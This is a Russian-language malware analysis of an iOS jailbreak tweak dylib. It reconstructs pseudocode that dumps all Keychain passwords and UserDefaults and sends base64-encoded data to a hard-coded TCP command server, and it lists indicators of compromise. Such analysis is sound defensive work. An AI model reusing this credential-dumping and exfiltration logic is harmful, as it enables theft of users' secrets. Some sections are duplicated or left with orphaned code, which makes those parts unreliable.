# 🔬 Полный реверс-инжиниринг harpy_fixed_v3.dylib

## Оглавление
- [Общая информация](#-общая-информация)
- [Архитектура бинарника](#-архитектура-бинарника)
- [Карта памяти (Сегменты)](#-карта-памяти-сегменты)
- [Архитектура приложения](#-архитектура-приложения)
- [Точка входа](#-точка-входа-entry-point)
- [Harpy DSL — Скриптовый язык](#-harpy-dsl--скриптовый-язык)
- [Парсер скриптов (sub_42B54)](#-парсер-скриптов-sub_42b54)
- [Сетевая активность (C2)](#-сетевая-активность-c2)
- [UI структура (SwiftUI)](#-ui-структура-swiftui)
- [Функциональная карта](#-полная-функциональная-карта)
- [Импорты и зависимости](#-импорты-и-зависимости)
- [Строки и константы](#-ключевые-строки-и-константы)
- [Индикаторы компрометации (IoC)](#-индикаторы-компрометации-ioc)

---

## 📋 Общая информация

| Параметр | Значение |
|----------|----------|
| **Тип файла** | iOS Dynamic Library (.dylib) |
| **Архитектура** | ARM64e (Apple iOS jailbreak tweak) |
| **Размер** | 441,336 байт (0x6BBF8) |
| **MD5** | `d0701a2f9fb3e92853472d0298bd4415` |
| **SHA256** | `43ff6e3d659361b4f53fe756642928a32df9c7111d2f6015417c10dab233bddb` |
| **CRC32** | `0x77355620` |
| **Путь установки** | `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` |
| **Язык** | Swift 5 + Objective-C interop |
| **Min iOS Version** | iOS 14.0+ (предположительно) |
| **Фреймворки** | SwiftUI, Combine, CoreData, Security, Network, CydiaSubstrate |

---

## 🏛️ Архитектура бинарника

### Карта памяти (Сегменты)

| Сегмент | Начало | Конец | Размер | Права | Назначение |
|---------|--------|-------|--------|-------|------------|
| `__TEXT` | 0x0 | 0x5C000 | 376KB | R-X | Исполняемый код |
| `__DATA_CONST` | 0x5C000 | 0x60000 | 16KB | R-- | Константные данные |
| `__DATA` | 0x60000 | 0x68000 | 32KB | RW- | Изменяемые данные |
| `__LINKEDIT` | 0x68000 | 0x6C000 | 16KB | R-- | Информация для линкера |

### Статистика функций

| Метрика | Значение |
|---------|----------|
| **Всего функций** | ~920 |
| **Swift функций** | ~800 |
| **ObjC методов** | ~50 |
| **Thunk/Bridge** | ~70 |
| **Строк** | ~500+ |
| **Структур** | ~50 |
| **Local types** | ~90 |

---

## 🏗️ Архитектура приложения

**Harpy** — iOS jailbreak-твик с SwiftUI интерфейсом для выполнения скриптов модификации приложений.

### Классовая иерархия

```
┌─────────────────────────────────────────────────────────────────┐
│                        CydiaSubstrate                          │
│                    (MobileSubstrate hook)                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                      SwiftUIWrapper                             │
│  +startMonitoring → dispatch_after(2sec) → presentContentView  │
└──────────────────────────┬──────────────────────────────────────┘
                           │
           ┌───────────────┼───────────────┐
           ▼               ▼               ▼
    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
    │  AppState   │ │  UserData   │ │HarpyLogger  │
    │  (Singleton)│ │(Environment)│ │   (C2)      │
    └──────┬──────┘ └──────┬──────┘ └──────┬──────┘
           │               │               │
           └───────────────┼───────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                        HarpyView                                │
│              (Main UI - sub_363B8, ~983 lines)                  │
│  ┌─────────┐ ┌──────────┐ ┌───────────┐ ┌─────────────────┐    │
│  │  Start  │ │ Settings │ │  Scripts  │ │    Logger       │    │
│  │ Button  │ │   View   │ │   View    │ │     View        │    │
│  └────┬────┘ └────┬─────┘ └─────┬─────┘ └────────┬────────┘    │
│       │           │             │                │              │
└───────┼───────────┼─────────────┼────────────────┼──────────────┘
        │           │             │                │
        ▼           ▼             ▼                ▼
   ┌──────────────────────────────────────────────────────────┐
   │               HarpyScript Parser (sub_42B54)             │
   │                     (~1883 lines)                        │
   │   .harpy.* commands → NSRegularExpression → Execute      │
   └──────────────────────────────────────────────────────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
        ┌──────────┐    ┌──────────┐     ┌──────────┐
        │UserDefaults│   │ Keychain │     │ CoreData │
        │  Manager   │   │ Manager  │     │ Manager  │
        └──────────┘    └──────────┘     └──────────┘
```

### Основные классы и адреса

| Класс | Адрес метаданных | Описание |
|-------|------------------|----------|
| `AppState` | 0xB77C | Singleton состояния (swift_once) |
| `SwiftUIWrapper` | - | ObjC wrapper для SwiftUI |
| `UserData` | 0x68B78 | EnvironmentObject пользователя |
| `HarpyScript` | 0x696E8 | Скриптовый движок |
| `HarpyLogger` | 0x69700 | Логирование в C2/Telegram |
| `HarpyBuy` | 0x696F8 | Экран покупки |
| `Scripting` | 0x696E0 | Редактор скриптов |
| `GeneralView` | 0x69708 | Общие настройки |
| `ContentView` | - | Корневой View |

---

## 🚀 Точка входа и механизм инъекции

### Архитектура инъекции

```
┌─────────────────────────────────────────────────────────────────┐
│                    /Library/MobileSubstrate/                    │
│                   DynamicLibraries/harpy.dylib                  │
└──────────────────────────┬──────────────────────────────────────┘
                           │ dylib load (automatic)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              +[SwiftUIWrapper startMonitoring]                  │
│                        (0xBF1C)                                 │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              SwiftUIWrapper_setupTimer (0xBD14)                 │
│  • NSTimer.scheduledTimerWithTimeInterval: 60 sec, repeat      │
│  • Check: NSProcessInfo.isLowPowerModeEnabled                  │
│  • If true → presentContentView()                               │
└──────────────────────────┬──────────────────────────────────────┘
                           │ isLowPowerModeEnabled == YES
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│         SwiftUIWrapper_injectHarpyUI (0xE5F0)                   │
│  • UIApplication.sharedApplication.connectedScenes             │
│  • Find active UIWindowScene (activationState == 0)            │
│  • Get first window from scene.windows                         │
│  • Create UIHostingController<ContentView>                     │
│  • Add as subview with full-screen constraints                 │
│  • Animate alpha 0→1 over 0.3s                                 │
└─────────────────────────────────────────────────────────────────┘
```

### ⚠️ Триггер активации

**Low Power Mode** используется как триггер для показа UI:
- Когда пользователь включает режим энергосбережения
- Таймер проверяет `isLowPowerModeEnabled` каждые 60 секунд
- При положительном значении инъектирует UI в активное окно

Это необычный выбор триггера — возможно, для обхода обнаружения или как "фича" для пользователя.

### sub_4000 — Dylib Initialization

```c
// Адрес: 0x4000
void __fastcall sub_4000() {
    // Получение singleton AppState
    // Вызов +[SwiftUIWrapper startMonitoring]
    objc_msgSend(SwiftUIWrapper, "startMonitoring");
    
    // Планирование задачи через 2 секунды
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
                   dispatch_get_main_queue(),
                   ^{
                       // Block в stru_64E70
                       // Показ UI
                   });
}
```

### AppState_onStartPressed (0x3BEE0) — Start Monitoring Handler

```c
// Адрес: 0x3BEE0 (переименовано: AppState_onStartPressed)
// Вызывается при нажатии кнопки "Start"
void AppState_onStartPressed() {
    // Установка флага isStartPressed = 1
    AppState.isStartPressed = 1;  // OBJC_IVAR____TtC5harpy8AppState_isStartPressed
    
    // Инициализация C2 соединения
    DispatchQueue_getMetadata(0);  // Получение метаданных очереди
    
    // Async задача через 2 секунды
    DispatchTime now = DispatchTime.now();
    DispatchTime delay = now + 2.0;
    OS_dispatch_queue.asyncAfter(delay, block);
}
```

### StartButton_createView (0x4546C) — UI кнопки "Start"

```c
// Адрес: 0x4546C (переименовано: StartButton_createView)
// Создает SwiftUI кнопку запуска
View StartButton_createView() {
    Text("Start")                           // LocalizedStringKey: 0x7472617453
        .font(.title2)                      // Font.TextStyle.title2
        .fontDesign(.rounded)               // Font.Design.rounded
        .fontWeight(.semibold)              // Font.Weight.semibold
        .foregroundColor(.white)            // static Color.white.getter
        .frame(height: 70)                  // 0x4051800000000000 = 70.0
        .padding(.horizontal, 25)           // EdgeInsets._all(25.0)
        .background {
            RoundedRectangle(cornerRadius: 20)  // FMOV V0.2D, #20.0
                .fill(Color.black)              // static Color.black.getter
        }
}
```

---

## 🔧 Harpy DSL — Скриптовый язык

### Полный список команд

#### 📁 UserDefaults операции

| Команда | Адрес строки | Описание |
|---------|--------------|----------|
| `.harpy.edit.userdefaults` | 0x50990 | Редактирование ключа |
| `.harpy.remove.userdefaults` | 0x509b0 | Удаление ключа |
| `.harpy.clear.userdefaults` | 0x509d0 | Полная очистка |
| `.harpy.read.userdefaults` | 0x509f0 | Чтение всех данных |

Пример реализации (sub_42B54):
```c
// Установка значения в UserDefaults
v50 = objc_msgSend(objc_opt_self(&OBJC_CLASS___NSUserDefaults), "standardUserDefaults");
v51 = String._bridgeToObjectiveC()(key);
v52 = String._bridgeToObjectiveC()(value);
objc_msgSend(v50, "setObject:forKey:", v51, v52);
```

**Harpy_readUserDefaults (0x46654)** — Чтение всех UserDefaults:
```c
// Адрес: 0x46654 (переименовано: Harpy_readUserDefaults)
String Harpy_readUserDefaults() {
    // Заголовок вывода
    char output[24] = "UserDefaults:\n";
    
    // Получение стандартных UserDefaults
    NSUserDefaults *defaults = [[NSUserDefaults standardUserDefaults];
    NSDictionary *dict = [defaults dictionaryRepresentation];
    
    // Конвертация в Swift Dictionary
    Dictionary<String, Any> swiftDict = Dictionary._unconditionallyBridgeFromObjectiveC(dict);
    
    // Итерация по всем ключам
    for (key, value in swiftDict) {
        // Форматирование: "key: value\n"
        String.append(key);
        String.append(": ");
        _print_unlocked(value);
        String.append("\n");
    }
    
    return output;  // Полный дамп UserDefaults
}
```

#### 🔐 Keychain операции

| Команда | Адрес строки | Regex паттерн |
|---------|--------------|---------------|
| `.harpy.edit.keychain` | 0x50a10 | `\.harpy\.edit\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.remove.keychain` | 0x50a30 | `\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.read.keychain` | 0x50a50 | - |

**Harpy_readKeychain (0x46DC0)** — Чтение всех записей Keychain:
```c
// Адрес: 0x46DC0 (переименовано: Harpy_readKeychain)
String Harpy_readKeychain() {
    // Формирование query для чтения ВСЕХ паролей
    NSDictionary *query = @{
        (id)kSecClass: (id)kSecClassGenericPassword,
        (id)kSecMatchLimit: (id)kSecMatchLimitAll,
        (id)kSecReturnAttributes: @YES,
        (id)kSecReturnData: @YES
    };
    
    CFTypeRef result = nil;
    OSStatus status = SecItemCopyMatching((CFDictionaryRef)query, &result);
    
    if (status == errSecSuccess && result != nil) {
        // Конвертация CFArray в Swift Array
        Array<Dictionary> items = dynamicCast(result);
        
        // Объединение всех записей через "\n"
        return BidirectionalCollection.joined(separator: "\n");
    }
    
    return "Keychain read error";  // Код ошибки: 0x1000000000000021
}
```

**Harpy_editKeychain (0x46C94)** — Удаление записи из Keychain:
```c
// Адрес: 0x46C94 (переименовано: Harpy_editKeychain)
void Harpy_editKeychain(String accountName) {
    // Формирование query для удаления
    NSDictionary *query = @{
        (id)kSecClass: (id)kSecClassGenericPassword,
        (id)kSecAttrAccount: accountName
    };
    
    // Удаление записи
    SecItemDelete((CFDictionaryRef)query);
}
```

#### 💾 CoreData операции

| Команда | Адрес строки | Описание |
|---------|--------------|----------|
| `.harpy.update.coredata` | 0x50a70 | Модификация записей |
| `.harpy.read.app` | - | Чтение данных приложения |

**Harpy_updateCoreData (0x47130)** — Модификация CoreData:
```c
// Адрес: 0x47130 (переименовано: Harpy_updateCoreData)
void Harpy_updateCoreData(script_data) {
    // Парсинг параметров скрипта
    // Паттерн: 0xD000000000000016 = ".harpy.update.coredata"
    
    // 1. Извлечение entity name
    String entityName = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 2. Извлечение predicate format
    String predicateFormat = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 3. Извлечение нового значения
    String newValue = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 4. Создание NSPredicate
    NSPredicate *predicate = [NSPredicate predicateWithFormat:predicateFormat];
    
    // 5. Создание fetch request
    NSFetchRequest *request = [[NSFetchRequest alloc] init];
    [request setPredicate:predicate];
    
    // 6. Обновление данных
    // ... модификация записей CoreData
}
```

#### 🖨️ Системные команды

| Команда | Адрес строки | Regex паттерн |
|---------|--------------|---------------|
| `.harpy.print(message:` | 0x50ad0 | Вывод в лог |
| `.harpy.execute(script:` | 0x50af0 | Рекурсивное выполнение |
| `.harpy.write.file` | 0x50ab0 | Запись в файл |
| `.harpy.update.server` | 0x50a90 | Обновление с сервера |
| `.harpy(sleep:` | - | Пауза (regex: `sleep:\s*(\d+)`) |
| `harpy(start)` | - | Маркер начала скрипта |
| `.modifyrestart` | - | Флаг перезапуска |

**Harpy_executeScript (0x490C8)** — Выполнение скрипта из файла:
```c
// Адрес: 0x490C8 (переименовано: Harpy_executeScript)
void Harpy_executeScript(URL baseURL, String scriptName) {
    // 1. Получение метаданных HarpyScript
    type_metadata_accessor_for_HarpyScript(0);
    
    // 2. Формирование полного пути
    URL scriptURL = URL.appendingPathComponent(baseURL, scriptName);
    
    // 3. Чтение содержимого файла в UTF-8
    String scriptContent = String.init(contentsOf: scriptURL, encoding: .utf8);
    
    // 4. Рекурсивный вызов парсера
    HarpyScript_executeCommands(scriptContent);
}
```

**Harpy_createRegex (0x4AA48)** — Создание регулярного выражения:
```c
// Адрес: 0x4AA48 (переименовано: Harpy_createRegex)
NSRegularExpression* Harpy_createRegex(String pattern, options) {
    NSError *error = nil;
    
    // Создание NSRegularExpression
    NSRegularExpression *regex = [[NSRegularExpression alloc] 
        initWithPattern:pattern 
        options:options 
        error:&error];
    
    if (regex == nil) {
        // Конвертация NSError в Swift Error
        _convertNSErrorToError(error);
        swift_willThrow();
    }
    
    return regex;
}

#### 🖨️ Системные команды

| Команда | Адрес строки | Regex паттерн |
|---------|--------------|---------------|
| `.harpy.print(message:` | 0x50ad0 | Вывод в лог |
| `.harpy.execute(script:` | 0x50af0 | Рекурсивное выполнение |
| `.harpy.write.file` | 0x50ab0 | Запись в файл |
| `.harpy.update.server` | 0x50a90 | Обновление с сервера |
| `.harpy(sleep:` | - | Пауза (regex: `sleep:(\+\d\))`) |
| `harpy(start)` | - | Маркер начала скрипта |
| `.modifyrestart` | - | Флаг перезапуска |

---

## ⚙️ Парсер скриптов (sub_42B54)

### Общая структура (~1883 строки)

```c
void __fastcall sub_42B54(__int64 script_data, __int64 script_bridge) {
    // 1. Получение метаданных HarpyScript
    v6 = type_metadata_accessor_for_HarpyScript(0);
    
    // 2. Инициализация итератора
    v10 = (*(_QWORD *)(v9 + 16));  // Количество строк
    
    // 3. Главный цикл обработки команд
    while (v10 > 0) {
        // Получение текущей подстроки
        v17 = *(v15 - 1);
        v20 = *v15;
        
        // Проверка "harpy(start)"
        strcpy(v464, "harpy(start)");
        if (StringProtocol.contains(v464)) {
            // Установка State.wrappedValue = 1
            State.wrappedValue.setter(v464, outputState);
        }
        
        // Проверка ".modifyrestart"
        strcpy(v464, ".modifyrestart");
        if (StringProtocol.contains(v464)) {
            // Включение флага перезапуска
        }
        
        // Проверка ".harpy.edit.userdefaults"
        v464[0] = 0xD000000000000018LL;  // Длина строки
        v464[1] = v441;  // Указатель на строку
        if (StringProtocol.contains(v464)) {
            // Парсинг параметров через sub_48464
            result = sub_48464(script, pattern, value);
            // NSUserDefaults.setObject:forKey:
        }
        
        // Проверка ".harpy.remove.userdefaults" (regex)
        v68 = objc_allocWithZone(&OBJC_CLASS___NSRegularExpression);
        v70 = sub_4AA48(pattern, 0);  // Создание regex
        // NSRegularExpression.firstMatchInString:options:range:
        // Извлечение capture group 1
        
        // Проверка ".harpy(sleep:"
        strcpy(v464, ".harpy(sleep:");
        if (StringProtocol.contains(v464)) {
            // Regex: sleep:(\+\d\)
            // Извлечение значения задержки
            // Парсинг числа
        }
        
        // Переход к следующей строке
        v15 = v16 + 4;
        --v10;
    }
    
    // 4. Финализация
    sub_49528(script_data, script_bridge);  // Сохранение конфигурации
}
```

### Regex паттерны (sub_4AA48)

```c
// Создание NSRegularExpression
id sub_4AA48(__int64 pattern_swift, __int64 pattern_bridge, __int64 options) {
    NSString *pattern = String._bridgeToObjectiveC()(pattern_swift, pattern_bridge);
    NSError *error = nil;
    NSRegularExpression *regex = [[NSRegularExpression alloc] 
        initWithPattern:pattern 
        options:options 
        error:&error];
    return regex;
}
```

### Парсинг параметров (sub_48464)

```c
__int64 sub_48464(__int64 script, __int64 key_pattern, __int64 value_pattern) {
    // Поиск ключа в скрипте
    for (int i = 0; i < count; i++) {
        if (StringProtocol.contains(substring, key_pattern)) {
            // Извлечение значения
            // Trim whitespace
            static CharacterSet.whitespacesAndNewlines.getter();
            result = StringProtocol.trimmingCharacters(in:);
            
            // Удаление кавычек
            CharacterSet.init(charactersIn:)("\"");
            return StringProtocol.trimmingCharacters(in:);
        }
    }
    return 0;
}
```

---

## 🌐 Сетевая активность (C2)

### ⚠️ Command & Control Server

| Параметр | Значение |
|----------|----------|
| **IP-адрес** | `92.246.138.114` |
| **Порт** | `4001` |
| **Протокол** | TCP (Network.framework) |
| **API** | NWConnection |

### HarpyNetwork_connectToServer (0x2A2EC) — C2 соединение

```c
// Адрес: 0x2A2EC (переименовано: HarpyNetwork_connectToServer)
void HarpyNetwork_connectToServer() {
    // 1. Создание endpoint
    // IP формируется из констант:
    // 0x312E3634322E3239 = "29.246.1" (little-endian)
    // 0x003431312E383339 = "38.114" (little-endian)
    // Итого: "92.246.138.114"
    NWEndpoint.Host host = NWEndpoint.Host.init(stringLiteral:)("92.246.138.114");
    
    // Порт: 0xFA1 = 4001
    NWEndpoint.Port port = NWEndpoint.Port.init(integerLiteral:)(4001);
    
    // 2. Получение TCP параметров
    NWParameters *params = NWParameters.tcp.getter();
    
    // 3. Создание соединения
    NWConnection *connection = NWConnection.__allocating_init(host:port:using:)(
        host, port, params);
    
    // 4. Установка обработчика состояния -> sub_2D984
    NWConnection.stateUpdateHandler.setter(connection, sub_2D984);
    
    // 5. Запуск на global queue с default QoS
    NWConnection.start(queue:)(connection, globalQueue);
}
```

### HarpyNetwork_onStateChange (0x2AA6C) — Обработчик состояния

```c
// Адрес: 0x2AA6C (переименовано: HarpyNetwork_onStateChange)
void HarpyNetwork_onStateChange(NWConnectionState state) {
    // Проверка состояния соединения
    if (state == NWConnection.State.failed) {
        // Переподключение через 2 секунды на main queue
        dispatch_async_after(main_queue, 2.0, ^{
            // Повторная попытка подключения
        });
    }
    else if (state == NWConnection.State.ready) {
        // Соединение установлено - отправка данных
        HarpyNetwork_onConnectionReady(context);  // sub_2AE40
    }
}
```

### HarpyNetwork_onConnectionReady (0x2AE40) — Отправка данных

```c
// Адрес: 0x2AE40 (переименовано: HarpyNetwork_onConnectionReady)
void HarpyNetwork_onConnectionReady(context) {
    // 1. Получение данных логгера через KeyPath
    KeyPath loggerPath = swift_getKeyPath(&unk_4FBB0);
    KeyPath dataPath = swift_getKeyPath(&unk_4FBD8);
    
    // 2. Чтение Published свойства
    static Published.subscript.getter(&data, loggerPath, dataPath);
    
    // 3. Конвертация в UTF-8 Data
    Data utf8Data = StringProtocol.data(using: .utf8, allowLossyConversion: false);
    
    // 4. Base64 кодирование
    String base64String = Data.base64EncodedString(options: []);
    
    // 5. Формирование JSON payload
    struct TelegramPayload {
        String telegramId;    // "telegramId" = 0x6D617267656C6574 + 0xEA00000000006449
        String data;          // base64 encoded data
        String action;        // "action" = 0x6E6F69746361
        String status;        // "enable" (0x656C62616E65) или "disable" (0x656C6261736964)
    };
    
    // 6. Кодирование в JSON
    JSONEncoder *encoder = JSONEncoder.init();
    Data jsonData = JSONEncoder.encode(payload);
    
    // 7. Отправка через NWConnection
    NWConnection.send(
        content: jsonData,
        contentContext: NWConnection.ContentContext.defaultMessage,
        isComplete: true,
        completion: .contentProcessed(HarpyNetwork_sendComplete)
    );
}
```

### HarpyNetwork_receiveData (0x2BB6C) — Прием данных

```c
// Адрес: 0x2BB6C (переименовано: HarpyNetwork_receiveData)
void HarpyNetwork_receiveData(data, context, isComplete, error) {
    if (error == nil) {
        // Парсинг JSON ответа через JSONDecoder
        JSONDecoder *decoder = JSONDecoder.init();
        ResponsePayload response = JSONDecoder.decode(from: data);
        
        // Проверка наличия поля "error" в ответе
        // sub_DB3C(0x726F727265LL, 0xE500000000000000LL) = "error"
        if (response.error != nil) {
            // Обработка ошибки - показ на main queue
            dispatch_async(main_queue, errorHandler);
        } else {
            // Успешный ответ - обновление HarpyLogger
            dispatch_async(main_queue, updateHandler);
        }
    }
}
        
        // Проверка на ошибку ("error" в ответе)
        if (swift_bridgeObjectRetain(response) && 
            sub_DB3C("error", 0xE500000000000000) != 0) {
            // Обработка ошибки
            dispatch_async(main_queue, ^{ /* ... */ });
        }
        else {
            // Обработка успешного ответа
            // Продолжение приема данных
            NWConnection.receive(
                minimumIncompleteLength: 1,
                maximumLength: 1024,
                completion: HarpyNetwork_receiveData
            );
        }
    }
}
```

### HarpyLogger — Телеметрия

Адрес type metadata: `0x69700`

```c
// Логирование и отправка через Telegram Bot API
// Bot: @harpyapp_bot (https://t.me/harpyapp_bot)

struct HarpyLogger {
    String telegramBotToken;      // _telegramId (0x68950)
    String chatId;
    Bool isEnabled;
    NWConnection *c2Connection;
    Published<String> logData;    // @Published данные для отправки
};

// Strings:
// - "Data logging in telegram bot" (0x506c0)
// - "Your Telegram ID" (0x50700)
// - "_telegramId" / "_telegramID" (0x50804, 0x6105f, 0x61260)
```

### Внешние URL

| URL | Назначение | Адрес строки |
|-----|------------|--------------|
| `https://i.ibb.co/SKYxFp1/logos.png` | Логотип приложения | 0x50700 |
| `https://t.me/harpysupport` | Поддержка | 0x506xx |
| `https://t.me/harpyapp_bot` | Telegram бот | 0x506E0 |
| `https://t.me/harpyapp` | Канал Harpy | 0x50790 |
| `https://t.me/lurizevl` | Разработчик | 0x506xx |
| `https://t.me/imharpy` | Профиль | 0x506xx |

---

## 📱 UI структура (SwiftUI)

### HarpyView.body (sub_363B8) — ~983 строки

```swift
var body: some View {
    ZStack {
        // Фон
        Color.init(red: 0.945, green: 0.945, blue: 0.945, opacity: 1.0)
        
        VStack {
            // Логотип
            AsyncImage(url: URL(string: "https://i.ibb.co/SKYxFp1/logos.png"))
                .resizable()
                .padding(.horizontal, 25)
                .padding(.top, 10)
            
            // Кнопка Start
            Button(action: { sub_38344() }, label: { sub_3859C() })
                .padding(EdgeInsets(top: 10, leading: 25, bottom: 10, trailing: 25))
            
            // Список навигации
            NavigationLink(destination: GeneralView()) { /* ... */ }
            NavigationLink(destination: HarpyLogger()) { /* ... */ }
            NavigationLink(destination: HarpyBuy()) { /* ... */ }
            NavigationLink(destination: HarpyScript()) { /* ... */ }
            NavigationLink(destination: Scripting()) { /* ... */ }
        }
    }
    .cornerRadius(20, style: .continuous)
}
```

### Кнопка Start (sub_4546C)

```swift
// sub_4546C - Start Button View
Button {
    // Action: sub_3BEE0 (Start monitoring)
} label: {
    Text("Start")
        .font(.title2.rounded.semibold)
        .foregroundColor(.white)
        .frame(height: 70)
        .background(
            RoundedRectangle(cornerRadius: 20)
                .fill(Color.black)
        )
        .padding(.horizontal, 25)
}
```

### UI Components Mapping

| Функция | Описание | SwiftUI компонент |
|---------|----------|-------------------|
| sub_363B8 | HarpyView.body | ZStack, VStack, Image |
| sub_43F0 | ContentView.body | ConditionalContent |
| sub_5198 | VStack builder | VStack with spacing |
| sub_3C768 | Rounded rectangle | RoundedRectangle, StrokeStyle |
| StartButton_createView (0x4546C) | Start button | Button, Text, Font |
| sub_3D4F4 | NavigationView | NavigationView, sheet |
| sub_2FA88 | HarpySettings | Image from URL, EdgeInsets |

---

## 🗺️ Полная функциональная карта (с переименованными функциями)

### Инициализация и Lifecycle

| Адрес | Функция | Новое имя | Описание |
|-------|---------|-----------|----------|
| 0x4000 | Entry Point | - | Инициализация dylib |
| 0xB77C | AppState.shared | - | Singleton accessor |
| 0x105F0 | Present UI | - | Показ UI через 1с |
| 0xC774 | Dismiss UI | - | Закрытие UI |
| 0x3BEE0 | sub_3BEE0 | **AppState_onStartPressed** | Обработчик Start |
| 0x2D99C | sub_2D99C | **DispatchQueue_getMetadata** | DispatchQueue init |

### Парсер скриптов

| Адрес | Функция | Новое имя | Описание |
|-------|---------|-----------|----------|
| 0x42B54 | sub_42B54 | **HarpyScript_executeCommands** | Главный парсер DSL (~1883 строк) |
| 0x48464 | sub_48464 | **Harpy_parseScriptCommand** | Извлечение параметров |
| 0x490C8 | sub_490C8 | **Harpy_executeScript** | Загрузка из файла |
| 0x47CFC | sub_47CFC | **Harpy_writeFile** | Запись в файл |
| 0x4AA48 | sub_4AA48 | **Harpy_createRegex** | Создание NSRegularExpression |

### UserDefaults операции

| Адрес | Функция | Новое имя | Операция |
|-------|---------|-----------|----------|
| 0x46654 | sub_46654 | **Harpy_readUserDefaults** | Чтение dictionaryRepresentation |
| 0x432C8 | sub_432C8 | - | setObject:forKey: |
| 0x44734 | sub_44734 | - | removeObjectForKey: |
| 0x43290 | sub_43290 | - | Парсинг + установка |

### Keychain операции

| Адрес | Функция | Новое имя | Операция |
|-------|---------|-----------|----------|
| 0x46DC0 | sub_46DC0 | **Harpy_readKeychain** | SecItemCopyMatching (ALL) |
| 0x46C94 | sub_46C94 | **Harpy_editKeychain** | SecItemDelete |
| 0x44680 | sub_44680 | - | SecItemCopyMatching |
| 0x440C4 | sub_440C4 | - | SecItemUpdate |

### CoreData операции

| Адрес | Функция | Новое имя | Операция |
|-------|---------|-----------|----------|
| 0x47130 | sub_47130 | **Harpy_updateCoreData** | NSPredicate + NSFetchRequest |
| 0x48C0C | sub_48C0C | - | Чтение директории |

### Сетевые функции (C2)

| Адрес | Функция | Новое имя | Описание |
|-------|---------|-----------|----------|
| 0x2A2EC | sub_2A2EC | **HarpyNetwork_connectToServer** | TCP 92.246.138.114:4001 |
| 0x2AA6C | sub_2AA6C | **HarpyNetwork_onStateChange** | Обработчик состояния NWConnection |
| 0x2AE40 | sub_2AE40 | **HarpyNetwork_onConnectionReady** | Отправка данных при подключении |
| 0x2B710 | sub_2B710 | **HarpyNetwork_sendComplete** | Callback после отправки |
| 0x2BB6C | sub_2BB6C | **HarpyNetwork_receiveData** | Прием данных от C2 |
| 0x2DC1C | sub_2DC1C | **HarpyLogger_wrapCallback** | Обертка для логгера |
| 0xD8E0 | sub_D8E0 | - | NSData initWithContentsOfURL |

### UI функции

| Адрес | Функция | Новое имя | View |
|-------|---------|-----------|------|
| 0x363B8 | sub_363B8 | - | HarpyView.body - Главный экран |
| 0x43F0 | sub_43F0 | - | ContentView.body - Root view |
| 0x4546C | sub_4546C | **StartButton_createView** | Кнопка Start |
| 0x2FA88 | sub_2FA88 | - | HarpySettings - Настройки |
| 0x3D4F4 | sub_3D4F4 | - | NavigationView - Навигация |
| 0x45AA4 | sub_45AA4 | - | File List - Список .txt файлов |

### Вспомогательные

| Адрес | Функция | Описание |
|-------|---------|----------|
| 0x4BBB8 | sub_4BBB8 | Освобождение State |
| 0x4BA88 | sub_4BA88 | Доступ к State |
| 0xCF20 | sub_CF20 | Type metadata accessor |
| 0xCF64 | sub_CF64 | Protocol conformance |

---

## 🗄️ Управление файлами и скриптами

### Harpy_ensureScriptDirectory (0x49AC4) — Создание директории

```c
// Адрес: 0x49AC4 
// Создает директорию "harpyscript" в Documents если не существует
void Harpy_ensureScriptDirectory() {
    // 1. Получение директории Documents
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *urls = [fm URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask];
    NSURL *documentsURL = urls[0];
    
    // 2. Добавление пути "harpyscript" (0x7263737970726168 + 0xEB00000000747069 = "harpyscript")
    NSURL *scriptDir = [documentsURL URLByAppendingPathComponent:@"harpyscript"];
    
    // 3. Проверка существования
    if (![fm fileExistsAtPath:scriptDir.path]) {
        // 4. Создание директории
        NSError *error = nil;
        [fm createDirectoryAtURL:scriptDir 
         withIntermediateDirectories:YES 
         attributes:nil 
         error:&error];
         
        if (error) {
            // Логирование ошибки через State.wrappedValue
        }
    }
}
```

### Harpy_saveScriptConfig (0x49528) — Сохранение конфигурации

```c
// Адрес: 0x49528
// Сохраняет текущий скрипт в файл harpyconfig.txt
void Harpy_saveScriptConfig(String script) {
    // 1. Получение директории
    NSURL *dir = Harpy_getScriptDirectory();
    
    // 2. Добавление имени файла "harpyconfig.txt"
    // 0x6E6F637970726168 = "harpycon"
    // 0xEF7478742E676966 = "fig.txt"
    NSURL *configURL = URL.appendingPathComponent("harpyconfig.txt");
    
    // 3. Запись с UTF-8 кодировкой
    [script writeToURL:configURL 
           atomically:YES 
           encoding:NSUTF8StringEncoding 
           error:nil];
    
    // 4. Обновление State - "Script saved successfully"
    // 0x8000000000051040 + 0x1000000000000032 = строка статуса
    State.wrappedValue.setter(statusString);
    
    // 5. Обновление списка файлов
    Harpy_filterScriptFiles();  // sub_45AA4
}
```

### Harpy_listDirectoryContents (0x48C0C) — Чтение директории

```c
// Адрес: 0x48C0C
// Возвращает содержимое директории скриптов
String Harpy_listDirectoryContents() {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *dir = Harpy_getScriptDirectory();
    
    // Получение списка файлов
    NSArray *contents = [fm contentsOfDirectoryAtURL:dir 
                            includingPropertiesForKeys:nil 
                            options:0 
                            error:nil];
    
    // Формирование строки с переносами "\n"
    NSMutableString *result = [NSMutableString string];
    for (NSURL *file in contents) {
        [result appendFormat:@"%@\n", file.lastPathComponent];
    }
    
    return result;
}
```

### Harpy_filterScriptFiles (0x45AA4) — Фильтрация .txt файлов

```c
// Адрес: 0x45AA4
// Фильтрует файлы по расширению .txt
void Harpy_filterScriptFiles() {
    NSFileManager *fm = [NSFileManager defaultManager];
